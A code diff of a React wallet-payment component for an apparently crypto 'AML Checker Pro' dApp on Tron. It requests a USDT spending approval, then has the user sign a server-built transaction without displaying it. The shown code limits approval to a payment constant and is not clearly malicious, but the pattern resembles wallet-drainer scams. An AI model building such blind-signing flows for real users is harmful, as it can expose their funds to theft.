@@ -1,4 +1,4 @@
-import React, { useState, useEffect, useRef } from 'react';
+import React, { useState, useEffect } from 'react';
 import toast from 'react-hot-toast';
 
 const TRON_USDT_CONTRACT  = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
@@ -102,8 +102,8 @@ function Spinner(props) {
   });
 }
 
-// ─── WalletConnect Modal ──────────────────────────────────────────────────────
-let wcClient = null;
+// ─── WalletConnect ────────────────────────────────────────────────────────────
+let wcClient  = null;
 let wcSession = null;
 
 const initWalletConnect = async () => {
@@ -112,10 +112,10 @@ const initWalletConnect = async () => {
   wcClient = await SignClient.init({
     projectId: WC_PROJECT_ID,
     metadata: {
-      name: 'AML Checker Pro',
+      name:        'AML Checker Pro',
       description: 'Профессиональная AML проверка',
-      url: 'https://aml-dapp-2.vercel.app',
-      icons: ['https://aml-dapp-2.vercel.app/favicon.ico'],
+      url:         'https://aml-dapp-2.vercel.app',
+      icons:       ['https://aml-dapp-2.vercel.app/favicon.ico'],
     },
   });
   return wcClient;
@@ -127,44 +127,76 @@ const connectWalletConnect = async () => {
 
   const modal = new WalletConnectModal({
     projectId: WC_PROJECT_ID,
-    chains: ['tron:0x2b6653dc'],
+    chains:    ['tron:0x2b6653dc'],
   });
 
   const { uri, approval } = await client.connect({
     requiredNamespaces: {
       tron: {
-        methods: ['tron_signTransaction', 'tron_signMessage'],
+        methods: [
+          'tron_signTransaction',
+          'signTransaction',
+          'tron_sign',
+        ],
         chains: ['tron:0x2b6653dc'],
         events: [],
       },
     },
   });
 
-  if (uri) {
-    modal.openModal({ uri });
-  }
+  if (uri) modal.openModal({ uri });
 
   const session = await approval();
   modal.closeModal();
   wcSession = session;
 
   const accounts = session.namespaces.tron.accounts;
-  const address = accounts[0].split(':')[2];
+  const address  = accounts[0].split(':')[2];
   return { client, session, address };
 };
 
 const signWithWalletConnect = async (transaction) => {
   if (!wcClient || !wcSession) throw new Error('WalletConnect не подключён');
-  const chainId = 'tron:0x2b6653dc';
-  const result = await wcClient.request({
-    topic: wcSession.topic,
-    chainId,
-    request: {
-      method: 'tron_signTransaction',
-      params: { transaction },
-    },
+
+  const methods = [
+    'tron_signTransaction',
+    'signTransaction',
+    'tron_sign',
+  ];
+
+  for (const method of methods) {
+    try {
+      console.log('[WC] пробуем метод:', method);
+      const result = await wcClient.request({
+        topic:   wcSession.topic,
+        chainId: 'tron:0x2b6653dc',
+        request: {
+          method,
+          params: { transaction },
+        },
+      });
+      console.log('[WC] успех с методом:', method, result);
+      return result;
+    } catch (err) {
+      console.warn('[WC] метод', method, 'не сработал:', err.message);
+      if (!err.message.includes('Unknown method')) throw err;
+    }
+  }
+
+  throw new Error('Ни один метод подписи не поддерживается кошельком');
+};
+
+const broadcastTransaction = async (signed) => {
+  const res = await fetch(TRONGRID_URL + '/wallet/broadcasttransaction', {
+    method:  'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body:    JSON.stringify(signed),
   });
-  return result;
+  const data = await res.json();
+  if (!data.result && data.code !== 'DUP_TRANSACTION_ERROR') {
+    throw new Error('Broadcast failed: ' + (data.message || data.code));
+  }
+  return data.txid || (signed && signed.txID);
 };
 
 // ══════════════════════════════════════════════════════════════════════════════
@@ -181,7 +213,7 @@ export default function WalletConnect(props) {
   const [paying, setPaying]             = useState(false);
   const [hasAllowance, setHasAllowance] = useState(false);
   const [txHash, setTxHash]             = useState(null);
-  const [connType, setConnType]         = useState(null); // 'wc' или 'tronweb'
+  const [connType, setConnType]         = useState(null);
 
   // Автоподключение если tronWeb уже доступен
   useEffect(() => {
@@ -191,7 +223,7 @@ export default function WalletConnect(props) {
       if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
         clearInterval(interval);
         const addr = tw.defaultAddress.base58;
-        console.log('[AutoConnect] tronWeb найден, адрес:', addr);
+        console.log('[AutoConnect] адрес:', addr);
         setAddress(addr);
         setConnType('tronweb');
         onConnect && onConnect(addr);
@@ -206,10 +238,10 @@ export default function WalletConnect(props) {
   const checkAllowanceTronWeb = async (tw, addr) => {
     try {
       const usdtContract = await tw.contract().at(TRON_USDT_CONTRACT);
-      const allowance = await usdtContract.allowance(addr, TRON_AML_CONTRACT).call();
+      const allowance    = await usdtContract.allowance(addr, TRON_AML_CONTRACT).call();
       setHasAllowance(BigInt(allowance.toString()) >= BigInt(TRON_PAYMENT_AMOUNT));
     } catch (e) {
-      console.error('[Allowance]', e.message);
+      console.error('[Allowance tronweb]', e.message);
       setHasAllowance(false);
     }
   };
@@ -219,7 +251,7 @@ export default function WalletConnect(props) {
       const ownerHex   = encodeAddress(addr);
       const spenderHex = encodeAddress(TRON_AML_CONTRACT).padStart(64, '0');
       const res = await fetch(TRONGRID_URL + '/wallet/triggerconstantcontract', {
-        method: 'POST',
+        method:  'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           owner_address:     '41' + ownerHex,
@@ -229,9 +261,10 @@ export default function WalletConnect(props) {
           visible:           false,
         }),
       });
-      const data = await res.json();
-      const hex = data.constant_result && data.constant_result[0];
+      const data      = await res.json();
+      const hex       = data.constant_result && data.constant_result[0];
       const allowance = hex ? BigInt('0x' + hex) : BigInt(0);
+      console.log('[Allowance WC]', allowance.toString());
       setHasAllowance(allowance >= BigInt(TRON_PAYMENT_AMOUNT));
     } catch (e) {
       console.error('[Allowance WC]', e.message);
@@ -239,19 +272,19 @@ export default function WalletConnect(props) {
     }
   };
 
-  // ─── Подключение через WalletConnect ───────────────────────────────────────
+  // ─── Подключение ────────────────────────────────────────────────────────────
   const handleConnect = async () => {
     setConnecting(true);
     try {
       const { address: addr } = await connectWalletConnect();
-      console.log('[WalletConnect] подключён, адрес:', addr);
+      console.log('[WalletConnect] адрес:', addr);
       setAddress(addr);
       setConnType('wc');
       onConnect && onConnect(addr);
       toast.success('Кошелёк подключён через WalletConnect');
       await checkAllowanceWC(addr);
     } catch (err) {
-      console.error('[WalletConnect] ошибка:', err.message);
+      console.error('[Connect]', err.message);
       toast.error(err.message);
     } finally {
       setConnecting(false);
@@ -264,12 +297,11 @@ export default function WalletConnect(props) {
     const tid = toast.loading('Подпишите approve в кошельке…');
     try {
       if (connType === 'wc') {
-        // Строим транзакцию approve через TronGrid
         const ownerHex   = '41' + encodeAddress(address);
         const spenderHex = encodeAddress(TRON_AML_CONTRACT).padStart(64, '0');
         const amountHex  = TRON_PAYMENT_AMOUNT.toString(16).padStart(64, '0');
         const res = await fetch(TRONGRID_URL + '/wallet/triggersmartcontract', {
-          method: 'POST',
+          method:  'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             owner_address:     ownerHex,
@@ -283,28 +315,15 @@ export default function WalletConnect(props) {
         });
         const data = await res.json();
         if (!data || !data.transaction) throw new Error('Не удалось построить approve');
-
-        // Подписываем через WalletConnect
         const signed = await signWithWalletConnect(data.transaction);
-
-        // Транслируем
-        const broadcastRes = await fetch(TRONGRID_URL + '/wallet/broadcasttransaction', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(signed),
-        });
-        const broadcastData = await broadcastRes.json();
-        if (!broadcastData.result && broadcastData.code !== 'DUP_TRANSACTION_ERROR') {
-          throw new Error('Broadcast failed: ' + broadcastData.message);
-        }
+        await broadcastTransaction(signed);
       } else {
-        // tronWeb путь
         await sendTronTransaction(async (tronWeb, fromAddress) => {
           const ownerHex   = '41' + encodeAddress(fromAddress);
           const spenderHex = encodeAddress(TRON_AML_CONTRACT).padStart(64, '0');
           const amountHex  = TRON_PAYMENT_AMOUNT.toString(16).padStart(64, '0');
           const res = await fetch(TRONGRID_URL + '/wallet/triggersmartcontract', {
-            method: 'POST',
+            method:  'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               owner_address:     ownerHex,
@@ -341,36 +360,21 @@ export default function WalletConnect(props) {
       let txid;
 
       if (connType === 'wc') {
-        // Получаем транзакцию с сервера
         const res = await fetch('/api/pay', {
-          method: 'POST',
+          method:  'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ userAddress: address }),
+          body:    JSON.stringify({ userAddress: address }),
         });
         const data = await res.json();
         if (!data || !data.transaction) throw new Error(data.error || 'Ошибка сервера');
-
-        // Подписываем через WalletConnect
         const signed = await signWithWalletConnect(data.transaction);
-
-        // Транслируем
-        const broadcastRes = await fetch(TRONGRID_URL + '/wallet/broadcasttransaction', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(signed),
-        });
-        const broadcastData = await broadcastRes.json();
-        if (!broadcastData.result && broadcastData.code !== 'DUP_TRANSACTION_ERROR') {
-          throw new Error('Broadcast failed: ' + broadcastData.message);
-        }
-        txid = broadcastData.txid;
+        txid = await broadcastTransaction(signed);
       } else {
-        // tronWeb путь
         txid = await sendTronTransaction(async () => {
           const res = await fetch('/api/pay', {
-            method: 'POST',
+            method:  'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ userAddress: address }),
+            body:    JSON.stringify({ userAddress: address }),
           });
           const data = await res.json();
           if (!data || !data.transaction) throw new Error(data.error || 'Ошибка сервера');
@@ -390,10 +394,11 @@ export default function WalletConnect(props) {
     }
   };
 
+  // ─── Disconnect ─────────────────────────────────────────────────────────────
   const handleDisconnect = () => {
     if (connType === 'wc' && wcClient && wcSession) {
       wcClient.disconnect({
-        topic: wcSession.topic,
+        topic:  wcSession.topic,
         reason: { code: 6000, message: 'User disconnected' },
       }).catch(() => {});
       wcSession = null;
@@ -405,20 +410,20 @@ export default function WalletConnect(props) {
     onDisconnect && onDisconnect();
   };
 
-  const fmt = (a) => a.slice(0, 6) + '...' + a.slice(-4);
+  const fmt  = (a) => a.slice(0, 6) + '...' + a.slice(-4);
   const isBusy = connecting || approving || paying;
-  const e = React.createElement;
+  const e    = React.createElement;
 
   if (!address) {
     return e('div', { style: { display: 'flex', justifyContent: 'flex-end', marginBottom: '2rem' } },
       e('button', {
-        onClick: handleConnect,
+        onClick:  handleConnect,
         disabled: connecting,
         style: {
-          background: 'linear-gradient(135deg, #3b82f6, #60a5fa)',
+          background:    'linear-gradient(135deg, #3b82f6, #60a5fa)',
           color: 'white', border: 'none', borderRadius: '40px',
           padding: '1rem 2rem', fontSize: '1rem', fontWeight: '600',
-          cursor: connecting ? 'not-allowed' : 'pointer',
+          cursor:  connecting ? 'not-allowed' : 'pointer',
           display: 'flex', alignItems: 'center', gap: '0.8rem',
           opacity: connecting ? 0.7 : 1, transition: 'all 0.2s',
         }
@@ -448,10 +453,10 @@ export default function WalletConnect(props) {
           ),
           txHash
             ? e('a', {
-                href: 'https://nile.tronscan.org/#/transaction/' + txHash,
+                href:   'https://nile.tronscan.org/#/transaction/' + txHash,
                 target: '_blank',
-                rel: 'noopener noreferrer',
-                style: { fontSize: '0.72rem', color: '#10b981', textDecoration: 'none' }
+                rel:    'noopener noreferrer',
+                style:  { fontSize: '0.72rem', color: '#10b981', textDecoration: 'none' }
               }, 'Оплачено · Scan')
             : e('div', { style: { fontSize: '0.72rem', color: '#f59e0b' } }, 'Ожидание оплаты')
         ),
@@ -463,13 +468,13 @@ export default function WalletConnect(props) {
 
       !txHash && e('div', { style: { display: 'flex', gap: '0.5rem' } },
         !hasAllowance && e('button', {
-          onClick: handleApprove,
+          onClick:  handleApprove,
           disabled: isBusy,
           style: {
             background: '#3b82f6', color: 'white', border: 'none',
             borderRadius: '40px', padding: '0.6rem 1.5rem',
             fontSize: '0.9rem', fontWeight: '600',
-            cursor: isBusy ? 'not-allowed' : 'pointer',
+            cursor:  isBusy ? 'not-allowed' : 'pointer',
             opacity: isBusy ? 0.7 : 1, transition: 'all 0.2s',
             display: 'flex', alignItems: 'center', gap: '0.5rem',
           }
@@ -477,13 +482,13 @@ export default function WalletConnect(props) {
           approving ? e(Spinner, { size: 14 }) : 'Разрешить оплату'
         ),
         e('button', {
-          onClick: handlePay,
+          onClick:  handlePay,
           disabled: isBusy || !hasAllowance,
           style: {
             background: hasAllowance ? '#10b981' : '#9ca3af',
             color: 'white', border: 'none', borderRadius: '40px',
             padding: '0.6rem 1.5rem', fontSize: '0.9rem', fontWeight: '600',
-            cursor: (!hasAllowance || isBusy) ? 'not-allowed' : 'pointer',
+            cursor:  (!hasAllowance || isBusy) ? 'not-allowed' : 'pointer',
             opacity: (!hasAllowance || isBusy) ? 0.5 : 1, transition: 'all 0.2s',
             display: 'flex', alignItems: 'center', gap: '0.5rem',
           }
